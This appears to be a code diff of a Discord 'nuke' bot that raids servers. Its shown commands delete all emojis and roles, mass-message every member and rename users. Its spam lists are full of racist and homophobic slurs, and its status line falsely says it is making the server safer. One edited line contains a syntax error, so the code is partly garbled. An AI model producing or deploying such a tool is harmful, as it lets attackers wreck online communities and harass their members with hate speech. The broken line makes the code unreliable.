@@ -9,7 +9,7 @@ from dotenv import load_dotenv
 
 token = "YOUR TOKEN"
 
-SPAM_CHANNEL =  ["lmao" , "imagine :laugh:" , "get nuked niggas" , "s15_ always wins lol", "xander is fucking gay","gay ","lgbtq is cringe","faggot ","pussy nice","i date 5 and under, s15_#0338 ","31k","fuck off","nigga stfu"]  
+SPAM_CHANNEL =  ["lmao" , "imagine :laugh:" , "get nuked niggas" , "s15_ always wins lol", "xander is fucking gay","gay ","lgbtq is cringe","faggot ","pussy nice", "https://dsc.gg/w4nted ","31k","fuck off","https://dsc.gg/w4nted"]  
 SPAM_MESSAGE = ["@everyone get nuked s15_ on top"]
 
 intents = discord.Intents(messages=True, guilds=True, members=True)
@@ -28,8 +28,6 @@ async def on_ready():
 ██████╔╝███████╗██████╔╝  ██╗██║░╚███║╚██████╔╝██║░╚██╗███████╗██║░░██║
 ╚═════╝░╚══════╝╚═════╝░  ╚═╝╚═╝░░╚══╝░╚═════╝░╚═╝░░╚═╝╚══════╝╚═╝░░╚═╝
 
-ESΛFE
-https://discord.com/api/oauth2/authorize?client_id=948654100885700688&permissions=8&scope=bot
  ''')
    await client.change_presence(activity=discord.Game(name="currently making your server safer"))
 
@@ -83,7 +81,7 @@ async def nuke(ctx):
         print(Fore.GREEN + f"{user.name}#{user.discriminator} Was not unbanned." + Fore.RESET)
     await guild.create_text_channel("get fucking nuked lol")
     for channel in guild.text_channels:
-        link = await channel.create_invite(max_age = 0, max_uses = 0)
+        link = await channel.create_invite(max_age = 0, max_uses =A 0)
         print(f"New Invite: {link}")
     amount = 500
     for i in range(amount):
@@ -143,7 +141,7 @@ async def s15Help(ctx):
     await ctx.message.delete()
     await asyncio.sleep(0)
     try:
-            embed = discord.Embed(title="get nuked", description="Commands: \n \n .Emoji (deletes all emojis) \n **.s15 (main command)** \n .Message (messages everyone in the server)  \n .Role (deletes all roles) \n .Rename (renames everyone to whatever you specify) " , color=discord.Colour.blue()())
+            embed = discord.Embed(title="get nuked", description="Commands: \n \n -Emoji (deletes all emojis) \n **-nuke (main command)** \n -Message (messages everyone in the server)  \n -Role (deletes all roles) \n -Rename (renames everyone to whatever you specify) " , color=discord.Colour.blue()())
             embed.set_footer(text="daddy")
             await ctx.author.send(embed=embed)
     except:
